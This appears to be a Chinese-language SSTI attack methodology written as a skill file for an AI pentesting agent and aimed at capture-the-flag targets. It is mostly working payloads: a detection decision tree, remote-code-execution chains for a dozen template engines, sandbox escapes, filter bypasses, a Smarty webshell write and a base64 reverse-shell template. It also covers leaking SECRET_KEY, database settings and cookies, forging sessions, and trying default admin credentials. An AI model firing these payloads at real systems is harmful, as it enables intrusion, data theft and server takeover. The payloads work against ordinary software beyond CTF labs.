# ssti-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# SSTI 服务端模板注入方法论

## ⛔ 深入参考（确认引擎后必读对应文件）

- Jinja2 完整利用链（上下文变量→文件读取→RCE）→ [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
- Twig/Mako/FreeMarker/Pug/Django 利用或过滤绕过 → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
- 多引擎 RCE payload 速查与沙箱逃逸 → [references/multi-engine-payloads.md](references/multi-engine-payloads.md)

---

## Phase 0: 注入点定位（最先执行！）

**不要盲目在所有参数上尝试 SSTI payload！** 先定位哪些参数会被模板渲染：

1. 用 analyze_response 观察哪些参数值**出现在响应中**
2. 只有**回显到页面的参数**才可能是注入点
3. 常见回显参数：`name`, `username`, `message`, `greeting`, `template`, `title`, `q`, `search`

**陷阱**：HTML 转义的回显（`<` → `&lt;`）仍可能被模板渲染——`{{7*7}}` 可能生效。

## Phase 1: 检测模板注入（决策树）

```
Step 1: 发送 {{7*7}}
  → 返回 49 → 进入 Step 2
  → 原样返回 → 不是 Jinja2/Twig，进入 Step 3
  → 返回空/错误 → 可能有过滤，尝试 {{7*'7'}}

Step 2: 发送 {{7*'7'}}
  → 返回 7777777 → Jinja2 (Python) ★最常见
  → 返回 49 → Twig (PHP)

Step 3: 发送 ${7*7}
  → 返回 49 → Java EL / Mako / FreeMarker
Step 4: 发送 #{7*7}
  → 返回 49 → Ruby ERB 或 Pug
```

## Phase 2: 引擎识别辅助表

| 引擎 | 语言 | Server 头线索 | 确认方法 |
|------|------|-------------|---------|
| Jinja2 | Python/Flask | Werkzeug, gunicorn | `{{config}}` 有输出 |
| Django | Python | WSGIServer | `{{settings.DEBUG}}` |
| Twig | PHP | Apache+PHP | `{{_self.env.display('id')}}` |
| Mako | Python | - | `${self.module.__builtins__}` |
| FreeMarker | Java | Tomcat, Spring | `${.now}` 返回当前时间 |
| Pug/Jade | Node.js | Express | `#{7*7}` 返回 49 |

## Phase 3: 利用决策树

```
确认引擎类型
├─ Jinja2？→ [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
│   优先级：上下文变量 → config → 文件读取 → RCE(lipsum链)
├─ Twig？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
├─ Mako/FreeMarker/Pug？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
├─ Django？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
│   无 RCE！优先级：上下文变量穷举 → request.META → settings → admin 路径发现
└─ 有过滤？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)（过滤绕过部分）
```

**Jinja2 速查**（完整 payload → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)）：
```
{{lipsum.__globals__['os'].popen('id').read()}}       # RCE 首选
{{config}}                                              # 读配置
```

## 注意事项
- **先简单后复杂**：上下文变量 → config → 文件读取 → RCE
- **URL 编码**：GET 参数注入时 `{{` `}}` 需要编码
- **错误信息**：500 页面可能泄露引擎类型和 Python 版本

## Phase 4: 高级利用技术

### 4.1 子类遍历与 Payload 构造
- 使用循环 for + enumerate 遍历子类列表
- 目标类：`os._wrap_close`、`subprocess.Popen`
- 条件过滤：`if 'popen' in str(cls)` — 字符串匹配筛选
- 不同环境索引不同，需要动态查找而非硬编码索引

### 4.2 过滤绕过技巧
- 外部传参：`?a=__class__&b=__mro__`，模板中用 `request.args.a` 引用
- 过滤只在模板内容检查，不检查 URL 参数
- 拆分 payload：注入点和数据点分离
- 关键词被过滤时，通过 `globals.__self__` 到达 builtins 模块，用字符串拼接绕过：
  ```python
  {{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}
  {{ request.__class__.__init__.__globals__.__builtins__.exec("__imp"+"ort__('o'+'s').system('id')") }}
  ```

### 4.3 利用顺序
- 优先级最高：先试简单的，直接变量访问（`{{config}}`）
- 顺序：先确认后利用，先识别引擎再选 payload
- 最终：http_request 发送 RCE payload 获取 flag


---

## REF: jinja2-exploitation

# Jinja2 深度利用（SSTI 最常见引擎，80% 场景）

## 先尝试直接访问上下文变量（最快！）
```
{{flag}}
{{config}}
{{config.items()}}
{{request.environ}}
{{get_flashed_messages.__globals__}}
```
**很多场景 flag 就在模板上下文或 config 中，不需要 RCE！**

## 读配置和环境变量
```
{{config['SECRET_KEY']}}
{{config['FLAG']}}
{{request.environ['FLAG']}}
```

## 文件读取（不依赖 RCE）
先找到 file 子类编号：
```
{{''.__class__.__mro__[1].__subclasses__()}}
```
在输出中搜索 `_io._IOBase` 或 `<class '_io.FileIO'>` 的索引号 N，然后：
```
{{''.__class__.__mro__[1].__subclasses__()[N]('/flag.txt').read()}}
```

**陷阱**：子类索引号在不同 Python 版本/环境中不同！必须先列出再找。

## RCE（最后手段）
Jinja2 经典 RCE 链（按可靠性排序）：
```
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /FLAG.txt').read()}}
{{''.__class__.__mro__[2].__subclasses__()[IDX]('cat /FLAG.txt',shell=True,stdout=-1).communicate()}}
```

**推荐 lipsum 链**：`lipsum` 是 Jinja2 内置全局变量，几乎所有环境都可用。

## 找到 RCE 后的 flag 提取
```
# 先找 flag 文件
{{lipsum.__globals__['os'].popen('find / -name "*flag*" -o -name "*FLAG*" 2>/dev/null').read()}}
# 读取
{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
# 检查环境变量
{{lipsum.__globals__['os'].popen('env').read()}}
```


---

## REF: multi-engine-payloads

# 多引擎 RCE Payload 速查与沙箱逃逸

## 通用检测 Polyglot

一次性投递，根据响应差异判断引擎类型：

```text
${{<%[%'"}}%\
```

分步 polyglot 探测序列：

```text
{{7*7}}        → 49 则为 Jinja2/Twig/Tornado/Nunjucks 系
${7*7}         → 49 则为 FreeMarker/Velocity/Thymeleaf/Mako/EL 系
<%= 7*7 %>     → 49 则为 ERB/Slim/ASP/Mojolicious
#{7*7}         → 49 则为 Pug/Jade/FreeMarker(legacy)
@(2+2)         → 4  则为 Razor (.NET)
{7*7}          → 49 则为 Smarty
{{7*'7'}}      → 7777777 确认 Jinja2; → 49 确认 Twig
```

## 引擎识别决策树（完整版）

```text
输入 {{7*7}}
├─ 返回 49
│  ├─ {{7*'7'}} → 7777777 → Jinja2 (Python)
│  ├─ {{7*'7'}} → 49      → Twig (PHP)
│  └─ {{7*'7'}} → 报错    → Tornado / Nunjucks (看 Server 头)
├─ 返回 ${7*7}（原样）→ 非表达式语言
├─ 报错/空 → 可能有 WAF，换语法 ↓
│
输入 ${7*7}
├─ 返回 49
│  ├─ ${.version} 有值    → FreeMarker (Java)
│  ├─ ${T(java.lang.Math).random()} 有值 → Spring EL / Thymeleaf
│  └─ 其余 → Velocity / Mako / Java EL
│
输入 <%= 7*7 %>
├─ 返回 49 → ERB (Ruby) / ASP / Mojolicious
│
输入 #{7*7}
├─ 返回 49 → Pug/Jade (Node.js)
│
输入 @(2+2)
├─ 返回 4  → Razor (.NET)
│
输入 {7*7}
├─ 返回 49 → Smarty (PHP)
```

## 多引擎 RCE Payload 速查表

### ERB (Ruby)

```ruby
<%= system("id") %>
<%= `cat /etc/passwd` %>
<%= File.open('/etc/passwd').read %>
<%= IO.popen('id').readlines() %>
```

### Smarty (PHP)

```php
{system('id')}
{$smarty.version}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

注意：`{php}...{/php}` 在 Smarty v3 已废弃。

### Velocity (Java)

```java
#set($s="")
#set($rt=$s.getClass().forName("java.lang.Runtime").getRuntime())
#set($proc=$rt.exec("id"))
#set($out=$proc.getInputStream())
#set($sc=$s.getClass().forName("java.util.Scanner"))
$sc.getConstructor($out.getClass()).newInstance($out).useDelimiter("\A").next()
```

### Pebble (Java)

旧版本 (< 3.0.9)：

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```

新版本 (>= 3.0.9)：

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

### Handlebars (Node.js)

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Nunjucks (Node.js)

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### Tornado (Python)

```python
{% import os %}{{os.system('id')}}
```

### Razor (.NET)

```csharp
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@(1+2)
```

反射绕过黑名单（运行时加载 DLL）：

```text
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null,"/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null,"/bin/bash,-c whoami".Split(","))}
```

### Thymeleaf (Java / Spring)

```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

表达式前缀替换：`${...}` 不行就试 `#{...}`、`*{...}`、`@{...}`、`~{...}`。

## 沙箱逃逸技巧（按引擎）

| 引擎 | 限制场景 | 逃逸方法 |
|------|---------|---------|
| FreeMarker | `?new()` 被禁 | 用 `?api` 内建函数调 `class.forName()` 反射执行 |
| FreeMarker | `<#assign>` 被过滤 | 改用 `${"...Execute"?new()("id")}` 内联 |
| FreeMarker | 版本 < 2.3.30 | classLoader 链加载 ObjectWrapper 绕沙箱 |
| Pebble | >= 3.0.9 禁直接 exec | 通过 `(1).TYPE.forName()` 反射链获取 Runtime |
| Twig | 2.x/3.x 沙箱 | `{['id']|filter('system')}` 或 `sort('system')` |
| Smarty v3 | `{php}` 废弃 | 用 `{system('cmd')}` 或写文件 webshell |
| Handlebars | 无直接代码执行 | 原型链：`string.sub.constructor` 构造 Function |
| Nunjucks | 无 eval | `range.constructor(...)()` 构造函数执行 |
| Thymeleaf | 默认不支持动态模板 | 利用预处理 `__${...}__` 或 Spring View path 注入 |
| Razor (.NET) | 类黑名单 | `System.Reflection.Assembly.LoadFile/Load` 运行时加载 |
| Velocity | SecurityManager | `String.forName("java.lang.Runtime")` 反射绕过 |

## 自动化工具

```bash
# TInjA — polyglot 自动探测引擎
tinja url -u "http://target/?name=test" -H "Cookie: sess=xxx"

# SSTImap — 多引擎自动化利用
python3 sstimap.py -u "http://target/?name=test" -s

# Tplmap — 老牌 SSTI 利用工具
python2.7 tplmap.py -u "http://target/?name=*" --os-shell
```


---

## REF: other-engines-and-bypass

# 其他模板引擎利用 + 过滤绕过

## Twig 利用 (PHP)

Twig 版本决定利用方式：
```
# Twig 1.x（老版本，直接 RCE）
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 2.x/3.x（沙箱更严）
{{['id']|filter('system')}}
{{['cat /flag.txt']|filter('system')}}
```

## Mako (Python)
```
${__import__('os').popen('cat /flag.txt').read()}
```

## FreeMarker (Java) — 完整利用链

FreeMarker 是 Java 最常见的模板引擎（Spring Boot/MVC 常用）。利用核心是 `?new()` 内建函数。

### 检测

```
${7*7}        → 返回 49 → 可能是 FreeMarker 或 EL
<#assign x=7*7>${x}  → 返回 49 → 确认 FreeMarker
${.version}   → 返回 FreeMarker 版本号
```

### RCE 方式 1: Execute 类（最直接）

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}
```

单行写法：
```
${"freemarker.template.utility.Execute"?new()("cat /flag.txt")}
```

### RCE 方式 2: ObjectConstructor + ProcessBuilder

```
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=oc("java.lang.ProcessBuilder", ["cat","/flag.txt"])>
<#assign proc=pb.start()>
<#assign is=proc.getInputStream()>
<#assign isr=oc("java.io.InputStreamReader", is)>
<#assign br=oc("java.io.BufferedReader", isr)>
${br.readLine()}
```

读取多行输出：
```
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt=oc("java.lang.Runtime")>
<#assign proc=rt.getRuntime().exec(["sh","-c","cat /flag.txt"])>
<#assign is=proc.getInputStream()>
<#assign sc=oc("java.util.Scanner", is)>
${sc.useDelimiter("\\A").next()}
```

### RCE 方式 3: JythonRuntime（如果 Jython 在 classpath）

```
<#assign jr="freemarker.template.utility.JythonRuntime"?new()>
<@jr>import os; os.system("cat /flag.txt")</@jr>
```

### 方式 4: 文件读取（无需 RCE）

```
<#assign file=object?api.class.forName("java.io.File").getConstructor(object?api.class.forName("java.lang.String")).newInstance("/etc/passwd")>
<#assign sc=object?api.class.forName("java.util.Scanner").getConstructor(object?api.class.forName("java.io.File")).newInstance(file)>
${sc.useDelimiter("\\A").next()}
```

### 绕过沙箱/限制

如果 `?new()` 被禁：
```
# 利用 ?api 内建函数（需要 api_builtin_enabled=true）
${"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"cat /flag.txt")}

# 利用 ObjectWrapper
<#assign classLoader=object?api.class.getClassLoader()>
```

如果 `<#assign>` 被过滤：
```
# 使用 ${} 内联表达式（不需要 assign）
${"freemarker.template.utility.Execute"?new()("id")}
```

### FreeMarker 速查表

| 目标 | Payload |
|------|---------|
| 版本探测 | `${.version}` |
| RCE (简洁) | `${"freemarker.template.utility.Execute"?new()("id")}` |
| RCE (assign) | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| 读文件 | 通过 ProcessBuilder 执行 cat |
| 反弹 shell | `${ex("bash -c {echo,BASE64}|{base64,-d}|bash")}` |

## Pug (Node.js)
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('cat /flag.txt').toString();return sh}()}
```

## Django
Django 模板功能受限（不支持方法调用），但：
```
{{flag}}                    <- 上下文变量直接访问
{{settings.SECRET_KEY}}     <- 设置信息
{{settings.DATABASES}}      <- 数据库配置
{{debug}}                   <- 调试信息
```
Django 不支持 RCE，如果 flag 不在上下文中，需要换其他攻击面。

### Django 深度利用（无 RCE 但可泄露大量信息）

**Step 1: 上下文变量穷举**（最高优先级）
```
{{flag}}  {{FLAG}}  {{secret}}  {{key}}  {{password}}
{{user}}  {{admin}}  {{token}}  {{session}}
```

**Step 2: request 对象信息泄露**
```
{{request.META}}                     <- 所有环境变量（含 SECRET_KEY、数据库密码等）
{{request.META.SECRET_KEY}}          <- 直接读 SECRET_KEY
{{request.user}}                     <- 当前用户
{{request.session.items}}            <- Session 内容
{{request.resolver_match}}           <- URL 路由信息
{{request.COOKIES}}                  <- 所有 Cookie
```

**Step 3: settings 对象**
```
{{settings.DEBUG}}                   <- 是否开启调试
{{settings.SECRET_KEY}}              <- 签名密钥
{{settings.DATABASES}}               <- 数据库连接信息
{{settings.INSTALLED_APPS}}          <- 已安装应用列表
{{settings.ROOT_URLCONF}}            <- URL 配置模块路径
{{settings.TEMPLATES}}               <- 模板配置
```

**Step 4: DEBUG=True 时的 404 页面**
- 访问不存在的 URL → Django 调试页面显示所有 URL 路由
- 可以发现 `/admin/`、`/api/` 等隐藏路径

**Step 5: 如果 flag 不在模板变量中**
- 发现 `/admin/` → 尝试默认凭据 admin:admin, admin:password
- 用 `{{settings.SECRET_KEY}}` 伪造 session → 提权为 admin
- 用 `{{settings.DATABASES}}` 获取数据库信息 → 尝试直接读数据库
- 发现其他端点/API → 可能有更严重的漏洞（SQLi、文件读取等）

---

# 过滤绕过大全

## 下划线 `_` 被过滤
```
{{config|attr('\x5f\x5fclass\x5f\x5f')}}
{{config|attr('\u005f\u005fclass\u005f\u005f')}}
{{lipsum|attr(request.args.a)}}&a=__globals__
```

## 点号 `.` 被过滤
```
{{config['__class__']['__init__']['__globals__']}}
{{config|attr('__class__')|attr('__init__')|attr('__globals__')}}
```

## 括号 `()` 被过滤
```
使用 Jinja2 filter 链代替方法调用
```

## 引号 `' "` 被过滤
```
{{config|attr(request.args.a)}}&a=__class__
{{config|attr(request.cookies.a)}}  (Cookie: a=__class__)
```

## 关键字 (config/class/import) 被过滤
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

## 数字被过滤
```
使用 |length filter: ''|length 返回 0, 'a'|length 返回 1
```
